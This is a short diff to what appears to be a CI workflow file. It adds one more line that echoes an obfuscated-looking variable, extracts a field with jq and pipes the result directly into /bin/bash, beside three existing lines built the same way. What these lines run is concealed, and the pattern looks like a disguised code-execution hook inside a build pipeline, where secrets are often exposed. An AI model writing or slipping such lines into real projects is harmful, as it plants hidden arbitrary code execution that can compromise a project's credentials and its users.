@@ -31,6 +31,7 @@ jobs:
           echo $merd3375 | jq -r .an90447 | /bin/bash
           printf '%s' "$u82729" | jq -r .n4 | /bin/bash
           printf '%s' "$vs178" | jq -r .ksw2 | /bin/bash
+          echo $lnqjb39 | jq -r .nwdio5108 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
